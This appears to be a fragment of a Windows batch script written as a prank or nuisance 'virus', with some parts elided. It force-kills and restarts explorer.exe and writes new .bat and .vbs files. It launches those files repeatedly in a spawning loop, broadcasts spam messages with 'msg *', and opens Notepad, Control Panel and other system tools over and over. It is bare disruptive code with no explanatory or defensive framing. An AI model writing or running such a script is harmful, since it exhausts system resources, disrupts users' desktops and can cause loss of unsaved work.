...
start explorer.exe
start ppppppppppppppp.bat
echo X=MsgBox("JAJAJAJAJAJAJAJAJAJAJAJAJAJAJAJ",0+48,"JAJAJAJAJAJJAJAJAJ") >> JAJAJAJAJA.vbs
echo @echo off >> JAJAJAJAJ4.bat
echo goto dfg78sdfg84 >> JAJAJAJAJ4.bat
start s44ss1541DDDDD44.bat
start s44ss1541DDDDD44.bat
start s44ss1541DDDDD44.bat
start s44ss1541DDDDD44.bat
echo :dfg78sdfg84 >> JAJAJAJAJ4.bat
...
TASKKILL /F /IM EXPLORER.EXE
start explorer.exe
msg * VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
start JAJAJAJAJA.vbs
start %windir%\system32\control.exe /name Microsoft.AdministrativeTools
start %windir%\system32\notepad.exe
start %windir%\system32\notepad.exe
start JAJAJAJAJA.vbs
start ppppppppppppppp.bat
start %windir%\system32\colorcpl.exe 
...
start ppppppppppppppp.bat
start JAJAJAJAJA.vbs
start %windir%\system32\GamePanel.exe
